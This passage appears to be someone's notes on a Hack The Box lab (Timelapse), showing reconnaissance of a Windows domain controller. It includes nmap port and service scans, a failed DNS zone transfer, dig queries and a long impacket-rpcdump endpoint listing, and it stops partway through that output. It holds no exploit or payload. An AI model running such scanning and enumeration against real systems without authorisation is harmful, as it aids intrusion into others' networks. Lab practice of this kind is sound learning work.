### ping to confirm box is up
```bash
┌──(kali㉿kali)-[~]                     
└─$ ping 10.10.11.152                   
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=31.4 ms
64 bytes from 10.10.11.152: icmp_seq=2 ttl=127 time=31.4 ms
64 bytes from 10.10.11.152: icmp_seq=3 ttl=127 time=31.1 ms
64 bytes from 10.10.11.152: icmp_seq=4 ttl=127 time=30.6 ms
64 bytes from 10.10.11.152: icmp_seq=5 ttl=127 time=30.2 ms

```
### nmap for open ports
```bash
┌──(kali㉿kali)-[~]                     
└─$ nmap -p- --min-rate=1000 -T4 10.10.11.152 -oN 10.10.11.152_OpenPorts
                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 12:18 EDT
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 97.89% done; ETC: 12:20 (0:00:02 remaining)
Nmap scan report for 10.10.11.152                                                
Host is up (0.031s latency).                                                     
Not shown: 65517 filtered tcp ports (no-response)                                
PORT      STATE SERVICE                 
53/tcp    open  domain                  
88/tcp    open  kerberos-sec                                                     
135/tcp   open  msrpc                   
139/tcp   open  netbios-ssn                                                      
389/tcp   open  ldap                    
445/tcp   open  microsoft-ds                                                     
464/tcp   open  kpasswd5                
593/tcp   open  http-rpc-epmap                                                   
636/tcp   open  ldapssl                 
3268/tcp  open  globalcatLDAP                                                    
3269/tcp  open  globalcatLDAPssl                                                 
5986/tcp  open  wsmans                  
9389/tcp  open  adws                    
49667/tcp open  unknown                 
49673/tcp open  unknown                 
49674/tcp open  unknown                 
49693/tcp open  unknown                 
49719/tcp open  unknown                 

Nmap done: 1 IP address (1 host up) scanned in 87.15 seconds
```

### extract ports from nmap scan and pass into a new file listing them inline
- I should have created a new file with this command using `>>` at the end
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                
└─$ cat 10.10.11.152_OpenPorts | grep open | cut -d '/' -f 1 | paste -sd,        
53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693,497
19
```

### Instead I copy and pasted the string of ports into the nmap service scan
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                
└─$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,496
74,49693,49719 -sC -sV 10.10.11.152 -oN 10.10.11.152_OpenPorts                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 12:35 EDT                  
Nmap scan report for 10.10.11.152                                                
Host is up (0.073s latency).                                                     
                                                                                 
PORT      STATE SERVICE           VERSION                                        
53/tcp    open  domain            Simple DNS Plus                                
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-0
9-28 00:35:26Z)                                                                  
135/tcp   open  msrpc             Microsoft Windows RPC                          
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn                  
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain
: timelapse.htb0., Site: Default-First-Site-Name)                                
445/tcp   open  microsoft-ds?                                                    
464/tcp   open  kpasswd5?                                                        
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0            
636/tcp   open  ldapssl?                                                         
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain
: timelapse.htb0., Site: Default-First-Site-Name)                                
3269/tcp  open  globalcatLDAPssl?                                                
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)        
|_ssl-date: 2025-09-28T00:36:56+00:00; +7h59m59s from scanner time.              
|_http-server-header: Microsoft-HTTPAPI/2.0                                      
| ssl-cert: Subject: commonName=dc01.timelapse.htb                               
| Not valid before: 2021-10-25T14:05:29                                          
|_Not valid after:  2022-10-25T14:25:29                                          
| tls-alpn:                                                                      
|_  http/1.1                                                                     
|_http-title: Not Found                                                          
9389/tcp  open  mc-nmf            .NET Message Framing                           
49667/tcp open  msrpc             Microsoft Windows RPC                          
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0            
49674/tcp open  msrpc             Microsoft Windows RPC                          
49693/tcp open  msrpc             Microsoft Windows RPC                          
49719/tcp open  msrpc             Microsoft Windows RPC                          
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows             
                                                                                 
Host script results:                                                             
| smb2-time:                                                                     
|   date: 2025-09-28T00:36:16                                                    
|_  start_date: N/A                     
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode:                   
|   3:1:1:                              
|_    Message signing enabled and required                                       

Service detection performed. Please report any incorrect results at https://nmap.
org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.04 seconds

```
### DNS running on port 53 
- added 10.10.11.152 timelapse.htb to /etc/hosts
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                
└─$ sudo echo "10.10.11.152 timelapse.htb" >> /etc/hosts
```
- Zone Transfer failed
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                
└─$ dig axfr @10.10.11.152 timelapse.htb                                         

; <<>> DiG 9.20.9-1-Debian <<>> axfr @10.10.11.152 timelapse.htb
; (1 server found)                      
;; global options: +cmd                 
; Transfer failed.     
```
### Ran Dig - don't know why. Enumeration?
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                
└─$ dig @10.10.11.152 any timelapse.htb                                          
                                                                                 
; <<>> DiG 9.20.9-1-Debian <<>> @10.10.11.152 any timelapse.htb                  
; (1 server found)                                                               
;; global options: +cmd                                                          
;; Got answer:                                                                   
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34021
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:                   
; EDNS: version: 0, flags:; udp: 4000                                            
;; QUESTION SECTION:                    
;timelapse.htb.                 IN      ANY                                      

;; ANSWER SECTION:                      
timelapse.htb.          600     IN      A       10.10.11.152
timelapse.htb.          3600    IN      NS      dc01.timelapse.htb.
timelapse.htb.          3600    IN      SOA     dc01.timelapse.htb. hostmaster.ti
melapse.htb. 149 900 600 86400 3600
timelapse.htb.          600     IN      AAAA    dead:beef::ad82:1b2f:48a0:75f7
timelapse.htb.          600     IN      AAAA    dead:beef::245
timelapse.htb.          600     IN      AAAA    dead:beef::24e
timelapse.htb.          600     IN      AAAA    dead:beef::b5c6:f9aa:a6a6:3e26

;; ADDITIONAL SECTION:                  
dc01.timelapse.htb.     1200    IN      A       10.10.11.152
dc01.timelapse.htb.     1200    IN      AAAA    dead:beef::ad82:1b2f:48a0:75f7
dc01.timelapse.htb.     1200    IN      AAAA    dead:beef::245

;; Query time: 32 msec                  
;; SERVER: 10.10.11.152#53(10.10.11.152) (TCP)                                   
;; WHEN: Sat Sep 27 12:43:35 EDT 2025                                            
;; MSG SIZE  rcvd: 308    
```
### Impacket RPCdump
```bash
┌──(kali㉿kali)-[~/htb/timelapse]                                                                                                                                 
└─$ impacket-rpcdump 10.10.11.152                                                                                                                                 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                        
                                                                                                                                                                  
[*] Retrieving endpoint list from 10.10.11.152                                                                                                                    
Protocol: [MS-RSP]: Remote Shutdown Protocol                                                                                                                      
Provider: wininit.exe                                                                                                                                             
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0                                                                                                               
Bindings:                                                                                                                                                         
          ncacn_ip_tcp:10.10.11.152[49664]                                                                                                                        
          ncalrpc:[WindowsShutdown]                                                                                                                               
          ncacn_np:\\DC01[\PIPE\InitShutdown]                                                                                                                     
          ncalrpc:[WMsgKRpc0898D0]                                                                                                                                
                                                                                                                                                                  
Protocol: N/A                                                                                                                                                     
Provider: winlogon.exe                                                                                                                                            
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0                                                                                                               
Bindings:                                                                                                                                                         
          ncalrpc:[WindowsShutdown]                                                                                                                               
          ncacn_np:\\DC01[\PIPE\InitShutdown]                                                                                                                     
          ncalrpc:[WMsgKRpc0898D0]                                                                                                                                
          ncalrpc:[WMsgKRpc08A691]                                                                                                                                
                                                                                                                                                                  
Protocol: N/A                                                                                                                                                     
Provider: N/A                                                                                                                                                     
UUID    : D09BDEB5-6171-4A34-BFE2-06FA82652568 v1.0                                                                                                               
Bindings:                                                                                                                                                         
          ncalrpc:[csebpub]                                                                                                                                       
          ncalrpc:[LRPC-53800b32c10b874ff6]                                                                                                                       
          ncalrpc:[LRPC-23b32161692dfa980b]                                                                                                                       
          ncalrpc:[LRPC-f2ecc7406f2b68be9b]                                                                                                                       
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                                                                                                       
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                                                                                                       
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                                                                                                       
          ncalrpc:[actkernel]                                                                                                                                     
          ncalrpc:[umpo]                                                                                                                                          
          ncalrpc:[LRPC-23b32161692dfa980b]                                                                                                                       
          ncalrpc:[LRPC-f2ecc7406f2b68be9b]                                                                                                                       
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                                                                                                       
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                                                                                                       
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                                                                                                       
          ncalrpc:[actkernel]                                                                                                                                     
          ncalrpc:[umpo]                                                                                                                                          
          ncalrpc:[LRPC-f2ecc7406f2b68be9b]                                                                                                                       
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                                                                                                       
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                                                                                                       
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                                                                                                       
          ncalrpc:[actkernel]                                                                                                                                     
          ncalrpc:[umpo]                                                                                                                                          
          ncalrpc:[LRPC-96af0a8ca9bcfed6f3]                                                                                                                       
          ncalrpc:[LRPC-992408fb9d003637de]                                                                                                                       
                                                                                                                                                                  
Protocol: N/A                                                                                                                                                     
Provider: N/A                                                                                                                                                     
UUID    : 697DCDA9-3BA9-4EB2-9247-E11F1901B0D2 v1.0                                                                                                               
Bindings:                                                                                                                                                         
          ncalrpc:[LRPC-53800b32c10b874ff6]                                                                                                                       
          ncalrpc:[LRPC-23b32161692dfa980b]                                                                                                                       
          ncalrpc:[LRPC-f2ecc7406f2b68be9b]                                                                                                                       
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                                                                                                       
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                                                                                                       
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                                                                                                       
          ncalrpc:[actkernel]                                                                                                                                     
          ncalrpc:[umpo]                                                                                                                                          
                                                                                                                                                                  
Protocol: N/A                                                                                                                                                     
Provider: N/A                                                                                                                                                     
UUID    : 9B008953-F195-4BF9-BDE0-4471971E58ED v1.0                                                                                                               
Bindings:                                                                                                                                                         
          ncalrpc:[LRPC-23b32161692dfa980b]                                                                                                                       
          ncalrpc:[LRPC-f2ecc7406f2b68be9b]                                                                                                                       
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                                                                                                       
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                                                                                                       
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                                                                                                       
          ncalrpc:[actkernel]                                                                                                                                     
          ncalrpc:[umpo]                                                                                                                                          
                                                                                                                                                                  
Protocol: N/A                                                                                                                                                     
Provider: N/A                                                                                                                                                     
UUID    : DD59071B-3215-4C59-8481-972EDADC0F6A v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 0D47017B-B33B-46AD-9E18-FE96456C5078 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 95406F0B-B239-4318-91BB-CEA3A46FF0DC v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 4ED8ABCC-F1E2-438B-981F-BB0E8ABC010C v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 0FF1F646-13BB-400A-AB50-9A78F2B7A85A v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]   
       
Protocol: N/A                           
Provider: N/A                           
UUID    : 6982A06E-5FE2-46B1-B39C-A2C545BFA069 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 082A3471-31B6-422A-B931-A54401960C62 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : FAE436B0-B864-4A87-9EDA-298547CD82F2 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : E53D94CA-7464-4839-B044-09A2FB8B3AE5 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 178D84BE-9291-4994-82C6-3F909ACA5A03 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 4DACE966-A243-4450-AE3F-9B7BCB5315B8 v2.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 1832BCF6-CAB8-41D4-85D2-C9410764F75A v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : C521FACF-09A9-42C5-B155-72388595CBF0 v0.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 2C7FD9CE-E706-4B40-B412-953107EF9BB0 v0.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 88ABCBC3-34EA-76AE-8215-767520655A23 v0.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                      
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 76C217BC-C8B4-4201-A745-373AD9032B1A v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                      
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 55E6B932-1979-45D6-90C5-7F6270724112 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-36e4d099dd3fbf80c0]                                      
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 857FB1BE-084F-4FB5-B59C-4B2C4BE5F0CF v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : B8CADBAF-E84B-46B9-84F2-6F71C03F9E55 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]          

Protocol: N/A                           
Provider: N/A                           
UUID    : 20C40295-8DBA-48E6-AEBF-3E78EF3BB144 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 2513BCBE-6CD4-4348-855E-7EFB3C336DD3 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-58c2b3af9010b989d7]                                      
          ncalrpc:[OLEEA9F9D43A409D4AD36B4BF1537D8]                                                                                                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 0D3E2735-CEA0-4ECC-A9E2-41A2D81AED4E v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : C605F9FB-F0A3-4E2A-A073-73560F8D9E3E v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 1B37CA91-76B1-4F5E-A3C7-2ABFC61F2BB0 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 8BFC3BE1-6DEF-4E2D-AF74-7C47CD0ADE4A v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 2D98A740-581D-41B9-AA0D-A88B9D5CE938 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-057beb6c154cf9f7d8]                                      
          ncalrpc:[actkernel]                                                    
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 0361AE94-0316-4C6C-8AD8-C594375800E2 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 5824833B-3C1A-4AD2-BDFD-C31D19E23ED2 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : BDAA0970-413B-4A3E-9E5D-F6DC9D7E0760 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 3B338D89-6CFA-44B8-847E-531531BC9992 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 8782D3B9-EBBD-4644-A3D8-E8725381919B v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 085B0334-E454-4D91-9B8C-4134F9E793F3 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: N/A                           
UUID    : 4BEC6BB8-B5C2-4B6F-B2C1-5DA5CF92D0D9 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[umpo]                

Protocol: N/A                           
Provider: sysntfy.dll                   
UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name                                                                                            
Bindings:                               
          ncalrpc:[LRPC-42ac912b297e0ad913]                                      
          ncalrpc:[IUserProfile2]                                                
          ncalrpc:[LRPC-9e3a81074b63524f42]                                      
          ncalrpc:[LRPC-b09d72d4afebbef352]                                      
          ncalrpc:[senssvc]                                                      
          ncalrpc:[OLEBBBB03AC5042F27FBF773FABD201]                                                                                                               
          ncacn_ip_tcp:10.10.11.152[49667]                                       
          ncalrpc:[samss lpc]                                                    
          ncalrpc:[SidKey Local End Point]                                       
          ncalrpc:[protected_storage]                                            
          ncalrpc:[lsasspirpc]                                                   
          ncalrpc:[lsapolicylookup]                                              
          ncalrpc:[LSA_EAS_ENDPOINT]                                             
          ncalrpc:[lsacap]                                                       
          ncalrpc:[LSARPC_ENDPOINT]                                              
          ncalrpc:[securityevent]                                                
          ncalrpc:[audit]                                                        
          ncacn_np:\\DC01[\pipe\lsass]                                           
          ncalrpc:[LRPC-ff72f5953a2154554c]                                      
          ncalrpc:[OLE5E5CAB1B7DA4E22CAC74C83781C5]                                                                                                               

Protocol: N/A                           
Provider: nsisvc.dll                    
UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint                                                                                           
Bindings:                               
          ncalrpc:[LRPC-b35f556c78a1778c99]                                      

Protocol: N/A                           
Provider: nrpsrv.dll                    
UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint                                                                                           
Bindings:                               
          ncalrpc:[LRPC-b540657ef2d91cef5d]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : E40F7B57-7A25-4CD3-A135-7F7D3DF9D16B v1.0 Network Connection Broker server endpoint                                                                     
Bindings:                               
          ncalrpc:[LRPC-f81bd8b3d5f23b8c5d]                                      
          ncalrpc:[OLE77336D7F0CEAA62099D590844FFD]                                                                                                               
          ncalrpc:[LRPC-02051f8cadf49598d7]                                      
          ncalrpc:[LRPC-96af0a8ca9bcfed6f3]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 880FD55E-43B9-11E0-B1A8-CF4EDFD72085 v1.0 KAPI Service endpoint                                                                                         
Bindings:                               
          ncalrpc:[LRPC-f81bd8b3d5f23b8c5d]                                      
          ncalrpc:[OLE77336D7F0CEAA62099D590844FFD]                                                                                                               
          ncalrpc:[LRPC-02051f8cadf49598d7]                                      
          ncalrpc:[LRPC-96af0a8ca9bcfed6f3]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 5222821F-D5E2-4885-84F1-5F6185A0EC41 v1.0 Network Connection Broker server endpoint for NCB Reset module                                                
Bindings:                               
          ncalrpc:[LRPC-02051f8cadf49598d7]                                      
          ncalrpc:[LRPC-96af0a8ca9bcfed6f3]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : A500D4C6-0DD1-4543-BC0C-D5F93486EAF8 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-0259bf3329321c6dad]                                      
          ncalrpc:[LRPC-992408fb9d003637de]                                      

Protocol: N/A                           
Provider: dhcpcsvc6.dll                 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint                                                                                   
Bindings:                               
          ncalrpc:[dhcpcsvc6]                                                    
          ncalrpc:[dhcpcsvc]                                                     

Protocol: N/A                           
Provider: dhcpcsvc.dll                  
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint                                                                                     
Bindings:                               
          ncalrpc:[dhcpcsvc]                                                     

Protocol: [MS-EVEN6]: EventLog Remoting Protocol                                 
Provider: wevtsvc.dll                   
UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP                                                                                               
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49665]                                       
          ncacn_np:\\DC01[\pipe\eventlog]                                        
          ncalrpc:[eventlog]                                                     

Protocol: N/A                           
Provider: gpsvc.dll                     
UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 Group Policy RPC Interface                                                                                    
Bindings:                               
          ncalrpc:[LRPC-be5005c475092b7bf6]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 3A9EF155-691D-4449-8D05-09AD57031823 v1.0                                                                                                               
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49666]                                       
          ncalrpc:[LRPC-bc387c5ebc74b02338]                                      
          ncalrpc:[ubpmtaskhostchannel]                                          
          ncacn_np:\\DC01[\PIPE\atsvc]                                           
          ncalrpc:[LRPC-7daed64780cb329f8f] 

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol                                                                                                     
Provider: schedsvc.dll                  
UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0                                                                                                               
Bindings:                               
          ncacn_ip_tcp:10.10.11.152[49666]                                       
          ncalrpc:[LRPC-bc387c5ebc74b02338]                                      
          ncalrpc:[ubpmtaskhostchannel]                                          
          ncacn_np:\\DC01[\PIPE\atsvc]                                           
          ncalrpc:[LRPC-7daed64780cb329f8f]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 33D84484-3626-47EE-8C6F-E7E98B113BE1 v2.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-bc387c5ebc74b02338]                                      
          ncalrpc:[ubpmtaskhostchannel]                                          
          ncacn_np:\\DC01[\PIPE\atsvc]                                           
          ncalrpc:[LRPC-7daed64780cb329f8f]                                      

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol                                                                                                     
Provider: taskcomp.dll                  
UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0                                                                                                               
Bindings:                               
          ncacn_np:\\DC01[\PIPE\atsvc]                                           
          ncalrpc:[LRPC-7daed64780cb329f8f]                                      

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol                                                                                                     
Provider: taskcomp.dll                  
UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0                                                                                                               
Bindings:                               
          ncacn_np:\\DC01[\PIPE\atsvc]                                           
          ncalrpc:[LRPC-7daed64780cb329f8f]                                      

Protocol: N/A                           
Provider: schedsvc.dll                  
UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-7daed64780cb329f8f]                                      

Protocol: N/A                           
Provider: MPSSVC.dll                    
UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs                                                                                                       
Bindings:                               
          ncalrpc:[LRPC-5438d65890d58b7b7b]                                      
          ncalrpc:[LRPC-5b5f2242a1d7a1fd3c]                                      
          ncalrpc:[LRPC-d8ca077af7b9526469]                                      
          ncalrpc:[LRPC-5de1f30a61e35c7f7a]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : F47433C3-3E9D-4157-AAD4-83AA1F5C2D4C v1.0 Fw APIs                                                                                                       
Bindings:                               
          ncalrpc:[LRPC-5b5f2242a1d7a1fd3c]                                      
          ncalrpc:[LRPC-d8ca077af7b9526469]                                      
          ncalrpc:[LRPC-5de1f30a61e35c7f7a]                                      

Protocol: N/A                           
Provider: MPSSVC.dll                    
UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs                                                                                                       
Bindings:                               
          ncalrpc:[LRPC-d8ca077af7b9526469]                                      
          ncalrpc:[LRPC-5de1f30a61e35c7f7a]                                      

Protocol: N/A                           
Provider: BFE.DLL                       
UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API                                                                                      
Bindings:                               
          ncalrpc:[LRPC-5de1f30a61e35c7f7a]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 7F1343FE-50A9-4927-A778-0C5859517BAC v1.0 DfsDs service                                                                                                 
Bindings:                               
          ncacn_np:\\DC01[\PIPE\wkssvc]                                          
          ncalrpc:[LRPC-495050325234f9efa8]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : EB081A0D-10EE-478A-A1DD-50995283E7A8 v3.0 Witness Client Test Interface                                                                                 
Bindings:                               
          ncalrpc:[LRPC-495050325234f9efa8]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : F2C9B409-C1C9-4100-8639-D8AB1486694A v1.0 Witness Client Upcall Server                                                                                  
Bindings:                               
          ncalrpc:[LRPC-495050325234f9efa8]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service                                                                                    
Bindings:                               
          ncalrpc:[f060b34b-7b3e-4062-b2f5-bd5e44360069]                                                                                                          
          ncalrpc:[LRPC-6c4136c8ab851ec03f]                                      

Protocol: N/A                           
Provider: N/A                           
UUID    : C2D1B5DD-FA81-4460-9DD6-E7658B85454B v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD]                                                                                                               

Protocol: N/A                           
Provider: N/A                           
UUID    : F44E62AF-DAB1-44C2-8013-049A9DE417D6 v1.0                                                                                                               
Bindings:                               
          ncalrpc:[LRPC-2ea92b8f1169a6db06]                                      
          ncalrpc:[OLE9400262AB2E084771EAFC37900CD] 
          
Protocol: N/A                           
Provider: N/A                           
UUID    : F44E62AF-DAB1-44C2-8013-049A9DE417D6 v1.0                                                                                                               
Bindings:                               
